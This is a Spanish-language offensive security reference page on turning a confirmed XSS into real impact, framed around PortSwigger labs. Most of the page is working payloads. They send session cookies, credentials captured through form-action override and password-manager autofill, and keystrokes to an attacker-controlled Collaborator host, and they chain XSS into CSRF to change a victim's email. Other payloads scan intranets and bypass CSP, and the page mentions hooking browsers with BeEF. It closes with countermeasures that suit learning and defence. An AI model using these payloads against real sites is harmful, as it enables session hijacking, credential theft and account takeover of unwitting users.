---
title: Explotación de Cross-Site Scripting (XSS)
slug: explotacion-xss
aliases: [XSS exploitation, cookie hijacking, session theft, BeEF, form override, keylogger client-side, XSS to CSRF, XSS chain, same-origin auto-exfiltration, password manager autofill abuse, credential capture, dangling markup attack, formaction hijack, two-stage CSRF chain, SameSite bypass via GET, CSP directive injection, script-src-elem override]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1539, T1185, T1059.007]
related: [analisis-xss, analisis-csrf, analisis-seguridad-cabeceras]
learning_refs: [portswigger/exploiting-xss-to-steal-cookies, portswigger/exploiting-xss-to-capture-passwords, portswigger/exploiting-xss-to-bypass-csrf-defenses, portswigger/reflected-xss-very-strict-csp-dangling-markup, portswigger/reflected-xss-csp-directive-injection]
---

# Explotación de Cross-Site Scripting (XSS)

## Descripción
Conjunto de técnicas que se aplican una vez confirmada la inyección XSS (descubierta y caracterizada en `analisis-xss`). El objetivo es convertir la ejecución de JS arbitrario en el navegador de la víctima en un impacto concreto: robo de sesión, captura de credenciales, ejecución de acciones autenticadas, pivote hacia otros endpoints same-origin, o bypass de defensas adyacentes (CSRF tokens, mismas cookies). El JS ejecuta con la identidad de la víctima en el origen vulnerable, así que hereda todos los permisos de su sesión: lee `document.cookie` no-HttpOnly, navega same-origin sin restricciones CORS, y emite requests con sus credenciales adjuntas automáticamente.

## Herramientas
- **Burp Collaborator** (`*.oastify.com`) — receptor OOB para exfiltrar cookies, tokens, snippets de DOM. Requiere Burp Pro. Único canal externo permitido en PortSwigger Web Security Academy.
- **interactsh** / **webhook.site** / **requestbin** — equivalentes gratuitos a Collaborator para bug bounty real. **No funcionan dentro de PortSwigger Academy** (firewall del lab los descarta).
- **BeEF (Browser Exploitation Framework)** — control persistente del navegador "hookeado" via XSS: keylogger, screenshot, port scan interno, redirect, social engineering. Útil cuando la inyección permite cargar `<script src=//beef-host/hook.js>` y el atacante quiere sesión interactiva, no one-shot.
- **PortSwigger exploit server** — endpoint controlado por el atacante que algunos labs proveen explícitamente. Sirve HTML/JS/CSS con CSP relajada y se usa para inducir a la víctima a visitar un payload (típico en DOM XSS, CSRF chains, dangling markup).
- **document.cookie inspector** — DevTools → Application → Cookies. Para reemplazar la cookie robada y validar el hijack en el navegador del atacante.

## Comandos / Ejemplos

### Cookie hijacking (session theft)
La técnica canónica: el JS lee `document.cookie` y lo manda a un canal controlado por el atacante. Una vez recibido, el atacante reemplaza su cookie y opera como la víctima.

```html
<!-- Variante A: exfil via Burp Collaborator (Burp Pro) -->
<script>
fetch('https://COLLAB.oastify.com',{method:'POST',mode:'no-cors',body:document.cookie});
</script>
```

```html
<!-- Variante B: exfil via Image (GET, sin CORS preflight) -->
<script>
new Image().src='https://COLLAB.oastify.com/?c='+encodeURIComponent(document.cookie);
</script>
```

```html
<!-- Variante C: auto-exfiltración same-origin (sin canal externo).
     Útil en PortSwigger Academy donde el firewall bloquea webhook.site/interactsh.
     El script malicioso publica la cookie robada como un nuevo comentario en el blog del propio lab,
     que el atacante lee navegando al post después.

     CRITICAL: usar DOMContentLoaded - un <script> inline ejecuta cuando el parser HTML lo encuentra,
     ANTES de que los elementos del form (más abajo en la página) existan en el DOM. -->
<script>
addEventListener('DOMContentLoaded',()=>{
    fetch('/post/comment',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'csrf='+document.getElementsByName('csrf')[0].value
            +'&postId='+new URLSearchParams(location.search).get('postId')
            +'&name=stolen&email=a@a.com&website=http://a.com'
            +'&comment='+encodeURIComponent(document.cookie)
    });
});
</script>
```

```bash
# Inyección de la cookie robada en navegador del atacante (DevTools Console)
document.cookie="session=AbCdEfGh1234..."
# O en DevTools - Application - Cookies, doble click sobre el valor y pegar (sin "session=" prefix).
# Recargar la página: el atacante ya es la víctima.
```

> **Nota operacional - HttpOnly**: si la cookie de sesión tiene flag `HttpOnly`, `document.cookie` no la devuelve y este vector queda neutralizado. Casi todas las apps modernas la tienen, pero muchos labs y apps legacy NO. Confirmar con `curl -I` que `Set-Cookie` incluye `HttpOnly`. Si la tiene, recurrir a chains que actúan con la sesión sin extraerla (ver "XSS chain hacia CSRF" más abajo).

### XSS chain hacia CSRF (invalidar token anti-CSRF)
Los tokens CSRF defienden de requests forjadas desde otro origen porque ese origen no puede leer el token. Pero el JS inyectado vive en el mismo origen, así que puede leer el token, construir una request válida, y enviarla. El atacante no necesita la cookie: la sesión va automática (same-origin).

```html
<script>
// Paso 1: GET a la página con el form que tiene el token
var req = new XMLHttpRequest();
req.onload = function() {
    // Paso 2: extraer token del HTML respondido
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    // Paso 3: emitir el POST autenticado con el token
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com');
};
req.open('GET','/my-account',true);
req.send();
</script>
```

> **Heurística**: cualquier acción protegida con token CSRF se convierte en una operación de un solo paso lógico cuando hay XSS same-origin: leer la página de origen, extraer el token, enviar el POST. El "two-step" (GET + POST) ocurre automático en el navegador de la víctima.

### Form override / credential capture
Cuando la XSS es persistente (stored) en una página que también renderiza un login form, sobrescribir el `action` del form para que las credenciales lleguen al canal del atacante en vez del server.

```html
<!-- Stored XSS en una página de blog que también tiene login en el header -->
<script>
var login = document.querySelector('form[action*="login"]');
login.action = 'https://COLLAB.oastify.com/log';
// Cuando la víctima teclea username/password y submitea, el POST va al collaborator
// con las credenciales en el body en lugar del backend legítimo.
</script>
```

> **Variante dinámica**: si el form se inyecta vía AJAX después del page load, usar un `MutationObserver` o `setInterval` para esperar a que aparezca antes de sobrescribir el action. Mismo patrón de timing que `DOMContentLoaded`.

### Password manager autofill abuse
Distinta de la sobrescritura de form action: aquí no hay form previo, lo inyectamos. Funciona porque los password managers (incluido el integrado del navegador) autocompletan silenciosamente cuando detectan inputs `name=username` + `type=password` en cualquier página del dominio donde tienen credenciales guardadas. La víctima no teclea nada; el browser rellena solo y un `onchange` exfiltra.

```html
<!-- Inyectado dentro de un comentario stored XSS -->
<input name=username id=username>
<input type=password name=password onchange="
    if(this.value.length)
        fetch('https://COLLAB.oastify.com',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});
">
```

```html
<!-- Variante same-origin para entornos con firewall (ver writeup capture-passwords) -->
<input name=username id=username>
<input type=password name=password onchange="
if(this.value.length){
    fetch('/post/comment',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'csrf='+document.getElementsByName('csrf')[0].value
            +'&postId='+new URLSearchParams(location.search).get('postId')
            +'&name=stolen&email=a@a.com&website=http://a.com'
            +'&comment='+encodeURIComponent(username.value+':'+this.value)
    });
}">
```

> **Por qué `username.value` funciona sin `getElementById`**: HTML define que cualquier elemento con `id` se expone como propiedad global del `window`. Es legacy pero universal. Útil cuando el payload tiene que ser corto. `autocomplete="off"` en el form **no defiende** porque la mayoría de password managers lo ignoran.

### Keylogger client-side
Captura cada tecla pulsada en la página y la exfiltra. Útil para apps donde el form crítico (transferir dinero, cambiar password) se rellena después del login.

```html
<script>
var keys = '';
document.addEventListener('keypress', function(e){
    keys += e.key;
    if(keys.length > 50){
        new Image().src = 'https://COLLAB.oastify.com/?k=' + encodeURIComponent(keys);
        keys = '';
    }
});
</script>
```

### XSS para enumeración interna (port scan, intranet recon)
Si la XSS es en un dashboard intranet, el navegador de la víctima puede emitir requests a IPs internas que el atacante no alcanza directamente. Patrón: usar `Image()` o `fetch` con `mode:'no-cors'` y medir éxito por timing/error events.

```html
<script>
['192.168.1.1','192.168.1.2','10.0.0.5'].forEach(ip => {
    var t0 = Date.now();
    fetch('http://'+ip+'/', {mode:'no-cors'})
        .then(()=> reportar(ip, 'open', Date.now()-t0))
        .catch(()=> reportar(ip, 'closed/filtered', Date.now()-t0));
});
function reportar(ip, estado, dt){
    new Image().src = 'https://COLLAB.oastify.com/?ip='+ip+'&s='+estado+'&dt='+dt;
}
</script>
```

### Bypass de Content Security Policy (CSP)
Cuando la app tiene CSP que bloquea `script-src 'unsafe-inline'`, los `<script>` directos no ejecutan. Bypass posibles, en orden de aplicabilidad:

```html
<!-- Bypass via JSONP endpoint en allowlist (patrón clásico).
     Si la CSP permite scripts de un dominio que sirve JSONP (Google APIs, Facebook),
     forzar un callback con código arbitrario. -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

```html
<!-- Bypass via framework gadget (AngularJS, Vue, jQuery legacy en allowlist).
     Si la CSP permite el CDN de Angular y la página tiene ng-app, CSTI ejecuta JS sin <script> inline. -->
<input ng-focus="$event.composedPath()|orderBy:'(z=alert)(1)'" autofocus>
```

```html
<!-- Bypass via exfil sin ejecución: si CSP es estricta pero permite img-src,
     extraer el secreto via timing/comparison side-channels usando <img> o CSS injection. -->
<style>input[name=csrf][value^="a"]{background:url(//COLLAB.oastify.com/?a)}</style>
<style>input[name=csrf][value^="b"]{background:url(//COLLAB.oastify.com/?b)}</style>
<!-- ... un selector por cada candidato; el navegador solo carga la URL del prefijo correcto -->
```

> **Heurística CSP bypass**: (1) revisar la CSP entera, no solo `default-src`; (2) buscar dominios en allowlist con JSONP o gadgets; (3) probar frameworks client-side que bypassean `unsafe-inline` legítimamente; (4) si todo lo anterior falla, recurrir a side-channels via CSS / img que no requieren ejecución JS.

### Auto-exfiltración same-origin (alternativa a OOB cuando hay firewall)
Generalización del patrón usado en el lab cookie-stealing. Útil cuando el target/lab bloquea egress externo y no se tiene Burp Pro. Cualquier endpoint same-origin que persista contenido legible por el atacante sirve como "Collaborator local".

```
Tipo de exfil          | Canal típico real             | Alternativa same-origin
-----------------------|-------------------------------|------------------------------------
Cookie / token         | Collaborator/webhook.site     | Comentario en blog, post en foro,
                       |                               | mensaje privado, perfil del usuario
Credentials capturados | Collaborator                  | Form override hacia comment endpoint
                       |                               | con cookie del atacante embedded
Snippets de DOM        | Collaborator                  | Mismo patrón: POST a un endpoint
                       |                               | que persista y devuelva en GET
Blind XSS / token leak | Collaborator                  | Mismo patrón si hay endpoint
                       |                               | de feedback / contact / chat
Blind SQLi OOB         | Collaborator (DNS, HTTP)      | NO viable, requiere Pro
```

> **Cuando NO funciona**: cuando el lab no tiene endpoint que persista contenido legible. En ese caso (típico en SQLi blind OOB sin feedback form), Burp Pro es realmente la única ruta práctica.

## Contramedidas
- **`HttpOnly` flag** en cookies de sesión - bloquea `document.cookie`, neutraliza el robo directo. Combinar con `Secure` para HTTPS-only y `SameSite=Strict` o `Lax` para limitar envío cross-site.
- **`Content Security Policy` estricta** sin `'unsafe-inline'` ni `'unsafe-eval'`, usando nonces o hashes para scripts legítimos. Verificar que los dominios en allowlist no expongan JSONP ni gadgets de framework.
- **Sanitizar output** según contexto del reflejo (ver `analisis-xss` para detalles): HTML entity escape para HTML body, JS hex/unicode escape para `<script>`, URL encode para atributos `href`/`src`. Nunca confiar en la entrada filtrada en el origen.
- **Rotación de tokens CSRF** por request (no por sesión) y validación estricta del referer/origin como segunda capa. No defiende contra XSS same-origin pero limita el impacto en chains cross-frame.
- **Subresource Integrity (SRI)** en scripts externos, para que un compromiso del CDN no inyecte JS adicional al hookear el navegador.
- **Detección server-side de patrones de auto-exfiltración**: si un endpoint que normalmente recibe contenido humano empieza a recibir bursts de POSTs con bodies que parecen tokens/cookies, alertar.
- **Subdominios separados para contenido sensible**: app principal en `app.example.com`, área de admin en `admin.example.com`. Una XSS en uno no compromete al otro porque ya no es same-origin (CORS bloquea, cookies no se comparten si se configuran con `Domain` específico).
- **Bandera `__Host-` en cookies sensibles** (requiere `Secure`, `Path=/`, sin `Domain` attribute). Refuerza que la cookie solo viaja al origen exacto que la setteó.

## Referencias
- MITRE Corporation. (2024). *ATT&CK Technique T1539: Steal Web Session Cookie*. https://attack.mitre.org/techniques/T1539/
- MITRE Corporation. (2024). *ATT&CK Technique T1185: Browser Session Hijacking*. https://attack.mitre.org/techniques/T1185/
- MITRE Corporation. (2024). *ATT&CK Technique T1059.007: Command and Scripting Interpreter: JavaScript*. https://attack.mitre.org/techniques/T1059/007/
- OWASP Foundation. (s.f.). *Session Hijacking Attack*. https://owasp.org/www-community/attacks/Session_hijacking_attack
- OWASP Foundation. (s.f.). *XSS Filter Evasion Cheat Sheet*. https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- BeEF Project. (s.f.). *The Browser Exploitation Framework*. https://beefproject.com/
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Capítulo 12 (Attacking Users: Cross-Site Scripting).
- Hoffman, A. (2020). *Web Application Security: Exploitation and Countermeasures for Modern Web Applications*. O'Reilly Media.
- Writeup propio: [`learning/portswigger/exploiting-xss-to-steal-cookies/writeup.md`](../../../learning/portswigger/exploiting-xss-to-steal-cookies/writeup.md) - cookie hijack via auto-exfiltración same-origin (firewall del lab + DOM timing).
- Writeup propio: [`learning/portswigger/exploiting-xss-to-capture-passwords/writeup.md`](../../../learning/portswigger/exploiting-xss-to-capture-passwords/writeup.md) - captura de user:password via password manager autofill abuse + onchange handler.
- Writeup propio: [`learning/portswigger/exploiting-xss-to-bypass-csrf-defenses/writeup.md`](../../../learning/portswigger/exploiting-xss-to-bypass-csrf-defenses/writeup.md) - chain XSS hacia change-email vía lectura same-origin del token CSRF.
